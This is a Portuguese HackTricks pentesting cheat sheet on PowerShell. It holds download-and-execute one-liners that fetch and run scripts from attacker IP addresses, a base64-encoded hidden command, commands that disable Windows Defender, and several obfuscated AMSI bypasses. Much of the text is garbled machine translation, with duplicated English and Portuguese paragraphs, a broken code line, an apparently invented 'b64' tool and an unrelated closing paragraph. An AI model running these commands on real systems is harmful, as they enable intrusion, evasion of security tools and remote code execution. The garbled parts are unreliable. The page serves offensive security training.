# PowerShell B√°sico para Pentesters

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Localiza√ß√µes padr√£o do PowerShell
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## Comandos b√°sicos do PowerShell para come√ßar

O PowerShell √© uma poderosa ferramenta de linha de comando e automa√ß√£o desenvolvida pela Microsoft. √â amplamente utilizado por pentesters para realizar v√°rias tarefas durante um teste de penetra√ß√£o. Abaixo est√£o alguns comandos b√°sicos do PowerShell que podem ser √∫teis para come√ßar:

### Get-Process
O comando `Get-Process` √© usado para obter informa√ß√µes sobre os processos em execu√ß√£o no sistema. Ele exibe detalhes como o ID do processo, nome do processo, uso de CPU e mem√≥ria.

Exemplo de uso:
```
Get-Process
```

### Get-Service
O comando `Get-Service` √© usado para obter informa√ß√µes sobre os servi√ßos em execu√ß√£o no sistema. Ele exibe detalhes como o nome do servi√ßo, status, modo de inicializa√ß√£o e descri√ß√£o.

Exemplo de uso:
```
Get-Service
```

### Get-EventLog
O comando `Get-EventLog` √© usado para obter informa√ß√µes sobre os logs de eventos do sistema. Ele permite visualizar eventos espec√≠ficos, como logs de seguran√ßa, logs de aplicativos e logs do sistema.

Exemplo de uso:
```
Get-EventLog -LogName Security
```

### Get-WmiObject
O comando `Get-WmiObject` √© usado para obter informa√ß√µes do Windows Management Instrumentation (WMI). Ele permite acessar informa√ß√µes do sistema, como configura√ß√µes de hardware, software instalado e muito mais.

Exemplo de uso:
```
Get-WmiObject -Class Win32_ComputerSystem
```

### Get-ChildItem
O comando `Get-ChildItem` √© usado para listar os arquivos e pastas em um diret√≥rio espec√≠fico. Ele exibe detalhes como nome, tamanho, data de cria√ß√£o e atributos dos arquivos e pastas.

Exemplo de uso:
```
Get-ChildItem C:\Users
```

Esses s√£o apenas alguns dos comandos b√°sicos do PowerShell que podem ser √∫teis para come√ßar. O PowerShell oferece uma ampla gama de recursos e funcionalidades avan√ßadas que podem ser exploradas para fins de pentesting.
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## Baixar e Executar

To download and execute a file using PowerShell, you can use the following command:

Para baixar e executar um arquivo usando o PowerShell, voc√™ pode usar o seguinte comando:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <output_file>; .\<output_file>
```

Replace `<URL>` with the URL of the file you want to download, and `<output_file>` with the desired name for the downloaded file.

Substitua `<URL>` pela URL do arquivo que voc√™ deseja baixar e `<output_file>` pelo nome desejado para o arquivo baixado.

For example, to download a file named `payload.exe` from `http://example.com/payload.exe` and execute it, you would use the following command:

Por exemplo, para baixar um arquivo chamado `payload.exe` de `http://example.com/payload.exe` e execut√°-lo, voc√™ usaria o seguinte comando:

```powershell
Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile payload.exe; .\payload.exe
```

Make sure to exercise caution when downloading and executing files from the internet, as they may contain malicious content. Always verify the source and integrity of the file before executing it.

Certifique-se de ter cuidado ao baixar e executar arquivos da internet, pois eles podem conter conte√∫do malicioso. Sempre verifique a origem e a integridade do arquivo antes de execut√°-lo.
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### Baixar e Executar em segundo plano com Bypass AMSI

Este script PowerShell permite baixar e executar um arquivo em segundo plano, contornando o AMSI (Antimalware Scan Interface).

#### Uso

1. Abra o PowerShell como administrador.
2. Execute o seguinte comando para habilitar a execu√ß√£o de scripts n√£o assinados:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```
3. Execute o seguinte comando para baixar e executar o arquivo em segundo plano:
```powershell
IEX (New-Object Net.WebClient).DownloadString('URL_DO_ARQUIVO')
```
Substitua `URL_DO_ARQUIVO` pela URL do arquivo que deseja baixar e executar.

#### Observa√ß√µes

- Certifique-se de que voc√™ tem permiss√µes de administrador para executar o PowerShell.
- O AMSI √© um recurso de seguran√ßa do Windows que verifica scripts PowerShell em busca de malware. O bypass do AMSI pode ser considerado uma t√©cnica de evas√£o.
- Tenha cuidado ao executar scripts de fontes desconhecidas, pois isso pode representar um risco de seguran√ßa.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Usando b64 no Linux

O comando `b64` √© uma ferramenta √∫til para codificar e decodificar dados em base64 no Linux. Ele pode ser usado para v√°rias finalidades, como a manipula√ß√£o de dados codificados em base64 durante testes de penetra√ß√£o. 

#### Codificando dados em base64

Para codificar dados em base64 usando o comando `b64`, voc√™ pode executar o seguinte comando:

```bash
echo "dados" | b64 -e
```

Substitua "dados" pelos dados que voc√™ deseja codificar. O comando acima ir√° codificar os dados em base64 e exibir o resultado na sa√≠da padr√£o.

#### Decodificando dados em base64

Para decodificar dados em base64 usando o comando `b64`, voc√™ pode executar o seguinte comando:

```bash
echo "dados codificados em base64" | b64 -d
```

Substitua "dados codificados em base64" pelos dados que voc√™ deseja decodificar. O comando acima ir√° decodificar os dados em base64 e exibir o resultado na sa√≠da padr√£o.

#### Exemplo de uso

Aqui est√° um exemplo de como usar o comando `b64` para codificar e decodificar dados em base64:

```bash
# Codificando dados em base64
echo "Hello, world!" | b64 -e

# Sa√≠da: SGVsbG8sIHdvcmxkIQ==

# Decodificando dados em base64
echo "SGVsbG8sIHdvcmxkIQ==" | b64 -d

# Sa√≠da: Hello, world!
```

O comando `b64` √© uma ferramenta √∫til para manipular dados codificados em base64 no Linux. Ele pode ser usado em v√°rias situa√ß√µes durante testes de penetra√ß√£o e outras atividades relacionadas √† seguran√ßa.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## Download

### System.Net.WebClient

O `System.Net.WebClient` √© uma classe do .NET Framework que fornece m√©todos para fazer download de arquivos da web. Ele √© amplamente utilizado por pentesters para baixar arquivos maliciosos ou explorar vulnerabilidades em sistemas.

#### Exemplo de Uso

```powershell
$webClient = New-Object System.Net.WebClient
$url = "http://www.example.com/malware.exe"
$destination = "C:\Downloads\malware.exe"
$webClient.DownloadFile($url, $destination)
```

Neste exemplo, o `System.Net.WebClient` √© usado para baixar um arquivo malicioso chamado `malware.exe` do URL `http://www.example.com/malware.exe` e salv√°-lo no diret√≥rio `C:\Downloads`.

#### Observa√ß√µes

- Certifique-se de que voc√™ tem permiss√£o para baixar arquivos da web antes de usar o `System.Net.WebClient`.
- Tenha cuidado ao baixar arquivos maliciosos e execute-os apenas em um ambiente controlado e seguro.
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
O comando `Invoke-WebRequest` √© usado para enviar solicita√ß√µes HTTP e HTTPS para um servidor web. Ele permite que os pentesters realizem v√°rias a√ß√µes, como fazer o download de arquivos, enviar dados para um formul√°rio da web e obter informa√ß√µes de uma p√°gina da web.

#### Sintaxe

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <WebRequestMethod>] [-Headers <IDictionary>] [-Body <Object>] [-ContentType <string>] [-UserAgent <string>] [-TimeoutSec <int>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-UseBasicParsing] [-SessionVariable <string>] [-WebSession <WebRequestSession>] [-MaximumRedirection <int>] [-SkipCertificateCheck] [<CommonParameters>]
```

#### Par√¢metros

- `-Uri`: Especifica a URL do servidor web para enviar a solicita√ß√£o.
- `-Method`: Especifica o m√©todo HTTP a ser usado na solicita√ß√£o, como GET, POST, PUT, DELETE, etc.
- `-Headers`: Especifica os cabe√ßalhos HTTP personalizados a serem inclu√≠dos na solicita√ß√£o.
- `-Body`: Especifica o corpo da solicita√ß√£o, que pode ser usado para enviar dados para um formul√°rio da web ou para enviar uma carga √∫til personalizada.
- `-ContentType`: Especifica o tipo de conte√∫do do corpo da solicita√ß√£o.
- `-UserAgent`: Especifica o agente do usu√°rio a ser usado na solicita√ß√£o.
- `-TimeoutSec`: Especifica o tempo limite, em segundos, para a solicita√ß√£o.
- `-Proxy`: Especifica o servidor proxy a ser usado para a solicita√ß√£o.
- `-ProxyCredential`: Especifica as credenciais a serem usadas para autentica√ß√£o no servidor proxy.
- `-UseBasicParsing`: Especifica se o analisador HTML b√°sico deve ser usado para analisar a resposta.
- `-SessionVariable`: Especifica o nome da vari√°vel para armazenar a sess√£o da solicita√ß√£o.
- `-WebSession`: Especifica uma sess√£o da solicita√ß√£o existente a ser usada.
- `-MaximumRedirection`: Especifica o n√∫mero m√°ximo de redirecionamentos permitidos.
- `-SkipCertificateCheck`: Especifica se a verifica√ß√£o do certificado SSL deve ser ignorada.

#### Exemplos

1. Fazendo uma solicita√ß√£o GET para uma p√°gina da web:

```powershell
Invoke-WebRequest -Uri "https://www.example.com"
```

2. Fazendo uma solicita√ß√£o POST com dados de formul√°rio:

```powershell
Invoke-WebRequest -Uri "https://www.example.com/login" -Method POST -Body @{username="admin"; password="password"} -ContentType "application/x-www-form-urlencoded"
```

3. Fazendo o download de um arquivo:

```powershell
Invoke-WebRequest -Uri "https://www.example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

4. Enviando uma solicita√ß√£o com cabe√ßalhos personalizados:

```powershell
$headers = @{
    "Authorization" = "Bearer token123"
    "Content-Type" = "application/json"
}

Invoke-WebRequest -Uri "https://www.example.com/api" -Headers $headers
```

#### Observa√ß√µes

- O comando `Invoke-WebRequest` √© uma ferramenta poderosa para interagir com servidores web durante um teste de penetra√ß√£o. Ele permite que os pentesters enviem solicita√ß√µes personalizadas e obtenham informa√ß√µes √∫teis para identificar vulnerabilidades e explorar sistemas.
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to retrieve files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to download files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

Wget also supports options that allow you to customize the download process. For example, you can use the `-O` option to specify a different name for the downloaded file, or the `-P` option to specify a different directory to save the file in.

Here are some examples of how you can use Wget:

- Download a file from a specific URL:
```
wget https://example.com/file.txt
```

- Download a file and save it with a different name:
```
wget -O newfile.txt https://example.com/file.txt
```

- Download a file and save it to a specific directory:
```
wget -P /path/to/directory https://example.com/file.txt
```

Wget is a powerful tool that can be used for various purposes, including downloading files during penetration testing. It is important to use it responsibly and within the boundaries of the law.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

O BitsTransfer √© um m√≥dulo do PowerShell que permite transferir arquivos entre computadores usando o protocolo Background Intelligent Transfer Service (BITS). O BITS √© um servi√ßo do Windows que permite transfer√™ncias de arquivos em segundo plano, de forma ass√≠ncrona e com suporte a pausa e retomada.

O m√≥dulo BitsTransfer fornece cmdlets (comandos) que permitem iniciar, pausar, retomar e cancelar transfer√™ncias de arquivos usando o BITS. Ele tamb√©m permite monitorar o progresso das transfer√™ncias e exibir informa√ß√µes detalhadas sobre cada transfer√™ncia.

Os cmdlets do BitsTransfer s√£o √∫teis para pentesters, pois permitem transferir arquivos de forma eficiente durante um teste de penetra√ß√£o. Por exemplo, voc√™ pode usar o cmdlet Start-BitsTransfer para transferir um arquivo malicioso para um sistema alvo e, em seguida, usar o cmdlet Get-BitsTransfer para monitorar o progresso da transfer√™ncia.

O BitsTransfer √© uma ferramenta poderosa para pentesters que desejam explorar vulnerabilidades em sistemas Windows. No entanto, √© importante us√°-lo com responsabilidade e apenas para fins legais e √©ticos.
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

Neste tutorial, vamos discutir como usar o Base64 no Kali Linux e o par√¢metro EncodedCommand no PowerShell para executar comandos codificados.

### Base64 no Kali Linux

O Base64 √© um m√©todo de codifica√ß√£o que converte dados bin√°rios em texto ASCII. No Kali Linux, podemos usar o comando `base64` para codificar e decodificar arquivos ou strings.

Para codificar um arquivo usando o Base64, use o seguinte comando:

```bash
base64 arquivo.txt
```

Isso ir√° codificar o conte√∫do do arquivo `arquivo.txt` e exibir o resultado na sa√≠da padr√£o.

Para decodificar um arquivo codificado em Base64, use o seguinte comando:

```bash
base64 -d arquivo.codificado
```

Isso ir√° decodificar o arquivo `arquivo.codificado` e exibir o conte√∫do original na sa√≠da padr√£o.

### Par√¢metro EncodedCommand no PowerShell

O PowerShell √© uma poderosa ferramenta de linha de comando e script da Microsoft. O par√¢metro `EncodedCommand` permite que voc√™ execute comandos codificados em Base64 diretamente no PowerShell.

Para codificar um comando em Base64, voc√™ pode usar o seguinte comando no PowerShell:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("comando"))
```

Substitua `"comando"` pelo comando que voc√™ deseja codificar.

Em seguida, voc√™ pode executar o comando codificado usando o par√¢metro `EncodedCommand`:

```powershell
powershell.exe -EncodedCommand "Y29tbWFuZA=="
```

Isso executar√° o comando codificado em Base64 no PowerShell.

Lembre-se de que o uso de comandos codificados em Base64 pode ajudar a evitar a detec√ß√£o de antiv√≠rus e firewalls, mas tamb√©m pode ser considerado uma atividade maliciosa. Certifique-se de usar essas t√©cnicas apenas para fins leg√≠timos e autorizados.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [Pol√≠tica de Execu√ß√£o](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [Linguagem Restrita](broken-reference/)

## [Pol√≠tica do AppLocker](broken-reference/)

## Habilitar o WinRM (PS Remoto)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Desativar o Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### Bypass AMSI

O arquivo **`amsi.dll`** √© **carregado** no seu processo e possui as **exporta√ß√µes** necess√°rias para qualquer aplicativo interagir com ele. E como ele √© carregado no espa√ßo de mem√≥ria de um processo que voc√™ **controla**, voc√™ pode alterar seu comportamento **sobrescrevendo instru√ß√µes na mem√≥ria**. Fazendo com que ele n√£o detecte nada.

Portanto, o objetivo dos bypasses do AMSI √© **sobrescrever as instru√ß√µes dessa DLL na mem√≥ria para tornar a detec√ß√£o in√∫til**.

P√°gina da web do gerador de bypass do AMSI: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### Bypass AMSI 2 - Hooking de Chamada de API Gerenciada

Verifique [**este post para informa√ß√µes detalhadas**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)[ **e o c√≥digo**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/).

Essa nova t√©cnica baseia-se no hooking de chamadas de API de m√©todos .NET. Acontece que os m√©todos .NET precisam ser compilados em instru√ß√µes nativas da m√°quina na mem√≥ria, que acabam se parecendo muito com m√©todos nativos. Esses m√©todos compilados podem ser hookados para alterar o fluxo de controle de um programa.

Os passos para realizar o hooking de chamadas de API de m√©todos .NET s√£o:

1. Identificar o m√©todo alvo para o hook
2. Definir um m√©todo com o mesmo prot√≥tipo de fun√ß√£o do alvo
3. Usar reflex√£o para encontrar os m√©todos
4. Garantir que cada m√©todo tenha sido compilado
5. Encontrar a localiza√ß√£o de cada m√©todo na mem√≥ria
6. Sobrescrever o m√©todo alvo com instru√ß√µes apontando para nosso m√©todo malicioso

### Bypass AMSI 3 - Privil√©gio SeDebug

[**Seguindo este guia e c√≥digo**](https://github.com/MzHmO/DebugAmsi), voc√™ pode ver como, com privil√©gios suficientes para depurar processos, √© poss√≠vel criar um processo powershell.exe, depur√°-lo, monitorar quando ele carrega `amsi.dll` e desabilit√°-lo.

## Hist√≥rico do PS
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## Obter permiss√µes

To gather information about the permissions assigned to a user or a group in a Windows system, you can use the following PowerShell commands:

Para obter informa√ß√µes sobre as permiss√µes atribu√≠das a um usu√°rio ou a um grupo em um sistema Windows, voc√™ pode usar os seguintes comandos do PowerShell:

### Get-ACL

The `Get-ACL` command retrieves the Access Control List (ACL) for a specified file or directory. It provides detailed information about the permissions assigned to the file or directory.

O comando `Get-ACL` recupera a Lista de Controle de Acesso (ACL) para um arquivo ou diret√≥rio especificado. Ele fornece informa√ß√µes detalhadas sobre as permiss√µes atribu√≠das ao arquivo ou diret√≥rio.

```powershell
Get-ACL -Path C:\path\to\file.txt
```

### Get-Acl | Format-List

The `Get-Acl | Format-List` command retrieves the ACL for a specified file or directory and formats the output as a list. This command provides a more detailed view of the permissions assigned to the file or directory.

O comando `Get-Acl | Format-List` recupera a ACL para um arquivo ou diret√≥rio especificado e formata a sa√≠da como uma lista. Este comando fornece uma vis√£o mais detalhada das permiss√µes atribu√≠das ao arquivo ou diret√≥rio.

```powershell
Get-ACL -Path C:\path\to\file.txt | Format-List
```

### Get-NTFSAccess

The `Get-NTFSAccess` command retrieves the NTFS permissions for a specified file or directory. It provides a simplified view of the permissions assigned to the file or directory.

O comando `Get-NTFSAccess` recupera as permiss√µes NTFS para um arquivo ou diret√≥rio especificado. Ele fornece uma vis√£o simplificada das permiss√µes atribu√≠das ao arquivo ou diret√≥rio.

```powershell
Get-NTFSAccess -Path C:\path\to\file.txt
```

### Get-EffectiveAccess

The `Get-EffectiveAccess` command retrieves the effective permissions for a specified user or group on a file or directory. It takes into account both explicit and inherited permissions.

O comando `Get-EffectiveAccess` recupera as permiss√µes efetivas para um usu√°rio ou grupo especificado em um arquivo ou diret√≥rio. Ele leva em considera√ß√£o tanto as permiss√µes expl√≠citas quanto as herdadas.

```powershell
Get-EffectiveAccess -Path C:\path\to\file.txt -Principal "DOMAIN\username"
```

These commands can be useful for a pentester to gather information about the permissions assigned to files and directories, which can help identify potential security vulnerabilities in a Windows system.

Esses comandos podem ser √∫teis para um pentester obter informa√ß√µes sobre as permiss√µes atribu√≠das a arquivos e diret√≥rios, o que pode ajudar a identificar poss√≠veis vulnerabilidades de seguran√ßa em um sistema Windows.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## Vers√£o do sistema operacional e HotFixes

O PowerShell pode ser usado para obter informa√ß√µes sobre a vers√£o do sistema operacional e os HotFixes instalados. Isso pode ser √∫til para identificar vulnerabilidades conhecidas e garantir que o sistema esteja atualizado.

### Obtendo a vers√£o do sistema operacional

Para obter a vers√£o do sistema operacional, voc√™ pode usar o seguinte comando:

```powershell
(Get-WmiObject -Class Win32_OperatingSystem).Caption
```

Isso retornar√° a vers√£o do sistema operacional instalado no computador.

### Obtendo a lista de HotFixes

Para obter a lista de HotFixes instalados, voc√™ pode usar o seguinte comando:

```powershell
Get-HotFix
```

Isso retornar√° uma lista de todos os HotFixes instalados no sistema, incluindo o nome, descri√ß√£o, data de instala√ß√£o e n√∫mero de identifica√ß√£o.

### Verificando a presen√ßa de HotFixes espec√≠ficos

Se voc√™ estiver procurando por um HotFix espec√≠fico, pode usar o seguinte comando para verificar se ele est√° instalado:

```powershell
Get-HotFix -Id <HotFixID>
```

Substitua `<HotFixID>` pelo n√∫mero de identifica√ß√£o do HotFix que voc√™ est√° procurando. Se o HotFix estiver instalado, ele ser√° exibido na sa√≠da. Caso contr√°rio, nenhum resultado ser√° retornado.

Essas informa√ß√µes podem ser √∫teis para identificar vulnerabilidades conhecidas e garantir que o sistema esteja protegido contra amea√ßas conhecidas.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## Ambiente

---

## Description

---

## Descri√ß√£o

This repository contains basic PowerShell scripts that can be used by pentesters during Windows hardening engagements. These scripts are designed to help pentesters automate common tasks and perform security assessments on Windows systems.

